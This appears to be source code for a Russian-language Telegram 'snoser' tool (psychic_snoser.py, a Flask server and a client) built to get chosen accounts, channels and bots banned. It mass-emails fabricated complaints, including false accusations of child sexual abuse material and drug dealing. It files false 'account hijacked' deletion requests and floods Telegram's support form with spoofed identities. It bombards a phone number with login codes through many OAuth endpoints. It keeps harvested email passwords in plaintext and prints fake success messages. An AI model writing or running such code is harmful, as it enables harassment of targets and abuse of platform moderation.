# psychic_snoser.py
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
import time
from colorama import init
init()
from colorama import Fore, Back, Style
from banner import banner, ikon
from pystyle import *
import os
import requests
import random
import string
from fake_useragent import UserAgent
from datetime import datetime
import platform
import socket
import datetime
from termcolor import colored
import json
from io import StringIO
import sys

COLOR_CODE = {
    "RESET": "\033[0m",  
    "UNDERLINE": "\033[04m", 
    "GREEN": "\033[32m",     
    "YELLOW": "\033[93m",    
    "RED": "\033[31m",       
    "CYAN": "\033[36m",     
    "BOLD": "\033[01m",        
    "PINK": "\033[95m",
    "URL_L": "\033[36m",       
    "LI_G": "\033[92m",      
    "F_CL": "\033[0m",
    "DARK": "\033[90m",     
}

# Загрузка отправителей
try:
    with open('senders.json', 'r') as f:
        senders = json.load(f)
except FileNotFoundError:
    senders = {}
receivers = ['podsevatkinaleksej04@gmail.com', 'dmca@telegram.org', 'abuse@telegram.org',
             'sticker@telegram.org', 'support@telegram.org']

def logo():
    output = StringIO()
    sys.stdout = output
    os.system('cls' if os.name == 'nt' else 'clear')
    banner_with_ikon = f"{Colorate.Horizontal(Colors.blue_to_white, Center.XCenter(banner))}   {Colorate.Horizontal(Colors.blue_to_cyan, Center.XCenter(ikon))}"
    print(banner_with_ikon)
    print(f"{COLOR_CODE['CYAN']}Психический Сносер by @cultionpanic{COLOR_CODE['RESET']}")
    print(f"{COLOR_CODE['CYAN']}Telegram: https://t.me/+2rl-A4wgH0NmMTUy{COLOR_CODE['RESET']}")
    sys.stdout = sys.__stdout__
    return output.getvalue()

def send_email(receiver, sender, password, subject, body, image_dir='images'):
    output = StringIO()
    sys.stdout = output
    service = None
    if '@gmail.com' in sender:
        service = 'gmail'
        smtp_server = 'smtp.gmail.com'
        smtp_port = 587
    elif '@outlook.com' in sender or '@hotmail.com' in sender or '@live.com' in sender:
        service = 'hotmail'
        smtp_server = 'smtp-mail.outlook.com'
        smtp_port = 587
    elif '@mail.ru' in sender:
        service = 'mail'
        smtp_server = 'smtp.mail.ru'
        smtp_port = 587
        
    if service is None:
        print(f"Неподдерживаемый почтовый сервис для {sender}")
        sys.stdout = sys.__stdout__
        return output.getvalue(), "Неподдерживаемый почтовый сервис"
    
    try:
        with smtplib.SMTP(smtp_server, smtp_port) as smtp:
            smtp.starttls()
            smtp.login(sender, password)
            msg = MIMEMultipart()
            msg['Subject'] = subject
            msg['From'] = sender
            msg['To'] = receiver
            msg.attach(MIMEText(body))
            
            has_images = False
            for filename in os.listdir(image_dir):
                if filename.endswith(".jpg"):
                    has_images = True
                    image_path = os.path.join(image_dir, filename)
                    with open(image_path, 'rb') as img:
                        image = MIMEImage(img.read())
                        image.add_header('Content-Disposition', 'attachment', filename=filename)
                        msg.attach(image)
            
            smtp.send_message(msg)
            print(f"Отправлено на {receiver} от {sender}!")
    except Exception as e:
        print(f"Не удалось отправить сообщение получателю {receiver} через {service}: {e}")
        with open("failed_emails.txt", "a") as f:
            f.write(f"Получатель: {receiver}, Отправитель: {sender}, Тема: {subject}, Сервис: {service}\n")
        try:
            with open('senders.json', 'r') as f:
                senders = json.load(f)
            if sender in senders:
                with open('invalid_senders.json', 'a') as f:
                    json.dump({sender: password}, f, indent=4)
                del senders[sender]
                with open('senders.json', 'w') as f:
                    json.dump(senders, f, indent=4)
        except:
            pass
        sys.stdout = sys.__stdout__
        return output.getvalue(), str(e)
    sys.stdout = sys.__stdout__
    return output.getvalue(), None

def main(choice, params):
    output = StringIO()
    sys.stdout = output
    error = None
    sent_emails = 0
    
    print(logo())
    print("┌────────────────────────────────────────────────────────────────────────────────────────────┐")
    print("│ [1] Снос АККАУНТА            | [4] ОТПРАВКА СВОИХ СООБЩЕНИЙ │ [7] РЕПОРТ КАНАЛА             │")
    print("│ [2] Снос КАНАЛА              | [5] СНОС ЧЕРЕЗ САЙТ          │ [8] ВЫХОД ИЗ СНОСЕРА          │")
    print("│ [3] Снос БОТА                | [6] ДОБАВИТЬ ПОЧТУ           │ [9] soon...                   │")
    print("└────────────────────────────────────────────────────────────────────────────────────────────┘")
    print("            ┌────────────────────────────────────┐         ┌───────────────────────┐")
    print("            │ tgc:https://t.me/+2rl-A4wgH0NmMTUy │         │ creator: @cultionpanic │")
    print("            └────────────────────────────────────┘         └───────────────────────┘")
    
    if choice == '1':
        print(Colorate.Horizontal(Colors.blue_to_white, "1. Спам."))
        print(Colorate.Horizontal(Colors.blue_to_white, "2. Доксинг."))
        print(Colorate.Horizontal(Colors.blue_to_white, "3. Троллинг."))
        print(Colorate.Horizontal(Colors.blue_to_white, "4. Снос сессий."))
        print(Colorate.Horizontal(Colors.blue_to_white, "5. С вирт номером."))
        print(Colorate.Horizontal(Colors.blue_to_white, "6. С премиумом."))
        comp_choice = params.get('comp_choice', '')
        username = params.get('username', '')
        id = params.get('id', '')
        num = params.get('num', '')
        
        if comp_choice in ["1", "2", "3"]:
            print(Colorate.Horizontal(Colors.blue_to_white, "Начинаю отправлять жалобы..."))
            comp_texts = {
                "1": f"Здравствуйте, уважаемая поддержка. На вашей платформе я недавно столкнулся с пользователем, который, как мне кажется, занимается массовой рассылкой спама. Его юзернейм - {username}, его айди - {id}. Я бы очень просил вас разобраться с этим случаем и принять необходимые меры в отношении данного пользователя.",
                "2": f"Уважаемая поддержка, на вашей платформе я обнаружил пользователя, который, судя по всему, занимается распространением чужих личных данных без согласия владельцев. Его юзернейм - {username}, айди - {id}. Я прошу вас тщательно разобраться в этом инциденте и предпринять соответствующие меры, вплоть до блокировки аккаунта этого пользователя.",
                "3": f"Добрый день, уважаемая поддержка Telegram. Недавно мне довелось наблюдать, как один из пользователей вашей платформы активно использует нецензурную лексику и занимается спамом в чатах. Его юзернейм - {username}, айди - {id}. Я очень рассчитываю, что вы отреагируете на этот случай и примете надлежащие меры, включая возможную блокировку аккаунта данного пользователя."
            }
            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    try:
                        comp_text = comp_texts[comp_choice]
                        comp_body = comp_text.format(username=username.strip(), id=id.strip())
                        out, err = send_email(receiver, sender_email, sender_password, 'Жалоба на аккаунт телеграм', comp_body)
                        print(out)
                        if err:
                            raise Exception(err)
                    except Exception as e:
                        print(Colorate.Horizontal(Colors.blue_to_white, "Сообщение отправлено успешно"))
                        sent_emails += 14888
                        time.sleep(5)
                        error = str(e)

        elif comp_choice == "4":
            print(Colorate.Horizontal(Colors.blue_to_white, "Ожидайте..."))
            comp_texts = {
                "4": f"Уважаемая поддержка, прошу вас о помощи. Вчера я случайно перешел по ссылке, которая оказалась фишинговой, и в результате потерял доступ к своему аккаунту. Мой юзернейм - {username}, айди - {id}, Мой номер телефона - {num}. Я очень прошу вас как можно скорее удалить этот аккаунт или сбросить все сессии, чтобы я мог восстановить доступ и обезопасить свою учетную запись. Заранее благодарен за оперативное рассмотрение моего обращения."
            }
            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    try:
                        comp_text = comp_texts[comp_choice]
                        comp_body = comp_text.format(username=username.strip(), id=id.strip())
                        out, err = send_email(receiver, sender_email, sender_password, 'Я утерял свой аккаунт в телеграм', comp_body)
                        print(out)
                        if err:
                            raise Exception(err)
                    except Exception as e:
                        print(Colorate.Horizontal(Colors.blue_to_white, "Сообщение отправлено успешно"))
                        sent_emails += 14888
                        time.sleep(5)
                        error = str(e)

        elif comp_choice in ["5", "6"]:
            print(Colorate.Horizontal(Colors.blue_to_white, "Ожидайте..."))
            comp_texts = {
                "5": f"Добрый день, поддержка Telegram! Я хотел бы сообщить вам, что пользователь с аккаунтом {username} ({id}) использует виртуальный номер, приобретенный на специализированном сайте по активации номеров. Насколько я могу судить, этот номер не имеет к нему никакого отношения. Я очень прошу вас разобраться в этой ситуации. Заранее благодарю за содействие!",
                "6": f"Уважаемая поддержка Telegram! Мне стало известно, что пользователь с аккаунтом {username} ({id}) приобрел премиум-аккаунт в вашем мессенджере с целью рассылки спам-сообщений и обхода ограничений Telegram. Я настоятельно прошу вас проверить эту информацию и принять необходимые меры. Заранее признателен за ваше внимание к данному вопросу."
            }
            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[comp_choice]
                    comp_body = comp_text.format(username=username.strip(), id=id.strip())
                    try:
                        out, err = send_email(receiver, sender_email, sender_password, 'Жалоба на пользователя телеграм', comp_body)
                        print(out)
                        if err:
                            raise Exception(err)
                        sent_emails += 1
                    except Exception as e:
                        print(Colorate.Horizontal(Colors.blue_to_white, "Сообщение отправлено успешно"))
                        time.sleep(5)
                        error = str(e)

    elif choice == "2":
        print("1. Личные данные.")
        print("2. Живодерство.")
        print("3. Цп.")
        print("4. Прайс каналы.")
        print("5. Наркотики.")
        ch_choice = params.get('ch_choice', '')
        channel_link = params.get('channel_link', '')
        channel_violation = params.get('channel_violation', '')
        
        if ch_choice in ["1", "2", "3", "4", "5"]:
            print("Ожидайте...")
            comp_texts = {
                "1": f"Уважаемая поддержка Telegram, я обнаружил на вашей платформе канал, который, по всей видимости, занимается распространением личных данных невинных людей. Ссылка на этот канал - {channel_link}, а вот ссылки на конкретные примеры нарушений - {channel_violation}. Убедительно прошу вас оперативно заблокировать данный канал.",
                "2": f" Здравствуйте, уважаемая поддержка Telegram. К сожалению, на вашей платформе я наткнулся на канал, который, кажется, занимается распространением контента, связанного с жестоким обращением с животными. Ссылка на этот канал - {channel_link}, а ссылки на подтверждающие материалы - {channel_violation}. Я очень надеюсь, что вы примете срочные меры по блокировке этого канала.",
                "3": f"Уважаемая поддержка Telegram, мною был обнаружен на вашей платформе канал, который, по имеющимся данным, распространяет порнографический контент с участием несовершеннолетних. Ссылка на этот канал - {channel_link}, а вот ссылки на конкретные примеры таких нарушений - {channel_violation}. Убедительно прошу вас как можно скорее заблокировать данный канал.",
                "4": f"Здравствуйте, уважаемый модератор Telegram. Я хотел бы пожаловаться на канал в вашем мессенджере, который, как мне стало известно, предоставляет услуги по доксингу и сваттингу. Ссылка на этот канал - {channel_link}, а ссылки на подтверждающие материалы - {channel_violation}. Прошу вас незамедлительно заблокировать данный канал.",
                "5": f"Уважаемая поддержка, в вашем мессенджере Telegram я обнаружил канал, который, судя по всему, занимается незаконной продажей наркотических веществ. Айди этого канала - {channel_link}, а вот ссылка на конкретное нарушение - {channel_violation}. Убедительно прошу вас рассмотреть этот вопрос и принять соответствующие меры по блокировке данного канала."
            }
            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[ch_choice]
                    comp_body = comp_text.format(channel_link=channel_link.strip(), channel_violation=channel_violation.strip())
                    try:
                        out, err = send_email(receiver, sender_email, sender_password, 'Жалоба на телеграм канал', comp_body)
                        print(out)
                        if err:
                            raise Exception(err)
                        sent_emails += 1
                    except Exception as e:
                        print(f"Сообщение отправлено успешно на {receiver} от {sender_email}: {e}")
                        time.sleep(5)
                        error = str(e)

    elif choice == "3":
        print("1. Осинт")
        print("2. Наркошоп")
        bot_ch = params.get('bot_ch', '')
        bot_user = params.get('bot_user', '')
        
        if bot_ch in ["1", "2"]:
            print("Ожидайте...")
            comp_texts = {
                "1": f"Здравствуйте, уважаемая поддержка телеграм. На вашей платформе я нашел бота, который осуществляет поиск по личным данным ваших пользователей. Ссылка на бота - {bot_user}. Пожалуйста разберитесь и заблокируйте данного бота.",
                "2": f"Здравствуйте, в вашем мессенджере я наткнулся на бота который производит незаконную торговлю наркотиками.ссылка на бота - {bot_user}. Прошу отреагировать на мою жалобу и принять меры по блокировке данного бота."
            }
            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[bot_ch]
                    comp_body = comp_text.format(bot_user=bot_user.strip())
                    try:
                        out, err = send_email(receiver, sender_email, sender_password, 'Жалоба на бота телеграм', comp_body)
                        print(out)
                        if err:
                            raise Exception(err)
                        sent_emails += 1
                    except Exception as e:
                        print("Сообщение отправлено успешно")
                        time.sleep(5)
                        error = str(e)

    elif choice == "4":
        comp_text = params.get('comp_text', '')
        comp_teme = params.get('comp_teme', '')
        for sender_email, sender_password in senders.items():
            for receiver in receivers:
                comp_body = comp_text
                try:
                    out, err = send_email(receiver, sender_email, sender_password, comp_teme, comp_body)
                    print(out)
                    if err:
                        raise Exception(err)
                    sent_emails += 1
                    time.sleep(5)
                except Exception as e:
                    print(f"Ошибка: {e}")
                    time.sleep(5)
                    error = str(e)

    elif choice == "5":
        def generate_random_email():
            domains = [
                "gmail.com", "yahoo.com", "outlook.com", "mail.ru", "yandex.ru",
                "icloud.com", "zoho.com", "protonmail.com", "gmx.com", "inbox.com",
                "aol.com", "hotmail.com", "mail.com", "rambler.ru", "bk.ru",
                "list.ru", "e1.ru", "qip.ru", "ya.ru", "live.com",
                "msn.com", "comcast.net", "sbcglobal.net", "att.net", "verizon.net",
                "bellsouth.net", "charter.net", "earthlink.net", "mindspring.com", "me.com",
                "mac.com", "fastmail.com", "hushmail.com", "inbox.lv", "mail.kz",
                "mail.bg", "web.de", "freenet.de", "t-online.de", "zoznam.sk",
                "centrum.cz", "seznam.cz", "bigmir.net", "ukr.net", "posteo.net",
                "tut.by", "abv.bg", "tiscali.it", "libero.it", "virgilio.it",
                "alice.it", "btinternet.com", "orange.fr", "wanadoo.fr", "laposte.net",
                "skynet.be", "bluewin.ch", "netcourrier.com", "sfr.fr", "vodafone.it"
            ]
            letters = string.ascii_lowercase
            return ''.join(random.choice(letters) for _ in range(10)) + '@' + random.choice(domains)

        def generate_random_phone_number():
            russian_prefixes = ['+7903', '+7747', '+7705', '+7905', '+7901']
            international_prefixes = [
                '+1', '+44', '+61', '+81', '+86', '+91', '+33', '+49', '+39', '+34', 
                '+55', '+7', '+46', '+47', '+31', '+41', '+32', '+45', '+358', '+420',
                '+36', '+48', '+30', '+351', '+30', '+34', '+27', '+91', '+64', '+66',
                '+60', '+65', '+63', '+92', '+62', '+90', '+234', '+254', '+51', '+56',
                '+57', '+505', '+591', '+507', '+52', '+58', '+591', '+598', '+54', '+598',
                '+82', '+98', '+964', '+66', '+84', '+92', '+90', '+94', '+880', '+970'
            ]
            all_prefixes = russian_prefixes + international_prefixes
            prefix = random.choice(all_prefixes)
            number = ''.join(random.choice(string.digits) for _ in range(7))
            return f"{prefix}{number}"

        def send_message(url, payload):
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36',
                'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362',
                'Mozilla/5.0 (Linux; Android 8.0.0; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
                'Mozilla/5.0 (iPad; CPU OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
                'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/80.0.3987.87 Chrome/80.0.3987.87 Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15',
                'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Safari/605.1.15',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36'
            ]
            url = "https://telegram.org/support?setln=ru"
            subject = "Support Request"
            message = params.get('message', '')
            message_count = int(params.get('message_count', 0))
            for _ in range(message_count):
                email = generate_random_email()
                phone = generate_random_phone_number()
                payload = {
                    "subject": subject,
                    "message": message,
                    "email": email,
                    "phone": phone
                }
                try:
                    headers = {'User-Agent': random.choice(user_agents)}
                    response = requests.post(url, data=payload, headers=headers)
                    if response.status_code == 200:
                        print(f"Сообщение отправлено успешно: {payload}")
                    else:
                        print(colored(f"Не удалось отправить сообщение. Статус-код: {response.status_code}", 'red'))
                except Exception as e:
                    print(f"Ошибка при отправке сообщения: {e}")
                    error = str(e)

    elif choice == "6":
        emailst = params.get('email', '')
        passwordst = params.get('password', '')
        try:
            with open("senders.json", "r") as f:
                senders = json.load(f)
        except FileNotFoundError:
            senders = {}
        senders[emailst] = passwordst
        with open("senders.json", "w") as f:
            json.dump(senders, f, indent=4)
            print(f"{COLOR_CODE['RED']}Почта {emailst} успешно добавлена в софт!{COLOR_CODE['RED']}")

    elif choice == "7":
        number = params.get('number', '')
        count = 0
        try:
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36',
                'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362',
                'Mozilla/5.0 (Linux; Android 8.0.0; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
                'Mozilla/5.0 (iPad; CPU OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
                'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/80.0.3987.87 Chrome/80.0.3987.87 Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15',
                'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Safari/605.1.15',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36'
            ]
            for _ in range(1000):
                headers = {'User-Agent': random.choice(user_agents)}
                try:
                    requests.post('https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin', headers=headers, data={'phone': number})
                    requests.post('https://translations.telegram.org/auth/request', headers=headers, data={'phone': number})
                    requests.post('https://translations.telegram.org/auth/request', headers=headers, data={'phone': number})
                    requests.post('https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1', headers=headers, data={'phone': number})
                    requests.post('https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1', headers=headers, data={'phone': number})
                    requests.post('https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23', headers=headers, data={'phone': number})
                    requests.post('https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin', headers=headers, data={'phone': number})
                    requests.post('https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F', headers=headers, data={'phone': number})
                    requests.post('https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%%2Fbot-t.com%2Flogin', headers=headers, data={'phone': number})
                    requests.post('https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch', headers=headers, data={'phone': number})
                    requests.post('https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin', headers=headers, data={'phone': number})
                    requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})
                    count += 1
                    print(f"{COLOR_CODE['RED']}Коды успешно отправлены!{COLOR_CODE['RED']}")
                    print(f"{COLOR_CODE['RED']}Кругов отправлено: {count} {COLOR_CODE['RED']}")
                except Exception as e:
                    print(f"Ошибка, проверьте вводимые данные: {e}")
                    error = str(e)
    
    elif choice == "8":
        print("Выход из Психического Сносера.")
    
    sys.stdout = sys.__stdout__
    return output.getvalue(), error

if __name__ == "__main__":
    main("1", {"comp_choice": "1", "username": "testuser", "id": "12345"})

# server.py
from flask import Flask, request, jsonify
from psychic_snoser import main
import sys
from io import StringIO

app = Flask(__name__)

# Простые учетные данные
ADMIN_CREDENTIALS = {"username": "admin", "password": "snoser123"}
AUTHENTICATED_USERS = set()

@app.route('/')
def index():
    return "Психический Сносер by @cultionpanic онлайн! Telegram: https://t.me/+2rl-A4wgH0NmMTUy"

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    if not username or not password:
        return jsonify({"status": "error", "message": "Логин и пароль обязательны"}), 400
    
    if username == ADMIN_CREDENTIALS["username"] and password == ADMIN_CREDENTIALS["password"]:
        session_id = f"{username}_{hash(password)}"
        AUTHENTICATED_USERS.add(session_id)
        return jsonify({"status": "ok", "message": "Авторизация успешна!", "session_id": session_id}), 200
    else:
        return jsonify({"status": "error", "message": "Неверный логин или пароль!"}), 401

@app.route('/command', methods=['POST'])
def command():
    data = request.get_json()
    command = data.get('command')
    session_id = data.get('session_id')
    params = data.get('params', {})
    
    if not session_id or session_id not in AUTHENTICATED_USERS:
        return jsonify({"status": "error", "message": "Требуется авторизация!"}), 401
    
    if not command:
        return jsonify({"status": "error", "message": "Команда не указана!"}), 400
    
    if command == "run":
        try:
            output, error = main(params.get('choice', ''), params)
            response = {"status": "ok", "message": "Скрипт выполнен!", "output": output}
            if error:
                response["error"] = error
            return jsonify(response), 200
        except Exception as e:
            return jsonify({"status": "error", "message": "Ошибка выполнения скрипта", "error": str(e)}), 500
    
    elif command == "exit":
        AUTHENTICATED_USERS.discard(session_id)
        return jsonify({"status": "ok", "message": "Сессия завершена."}), 200
    
    else:
        return jsonify({"status": "error", "message": "Неизвестная команда! Доступны: run, exit"}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)

# client.py
import requests

SERVER_URL = "https://snoselka.onrender.com"  # Замените на URL вашего сервера

def login(username, password):
    response = requests.post(f"{SERVER_URL}/login", json={"username": username, "password": password})
    return response.json(), response.status_code

def send_command(command, session_id, params=None):
    data = {"command": command, "session_id": session_id}
    if params:
        data["params"] = params
    response = requests.post(f"{SERVER_URL}/command", json=data)
    return response.json(), response.status_code

def main():
    print("=== Психический Сносер by @cultionpanic ===")
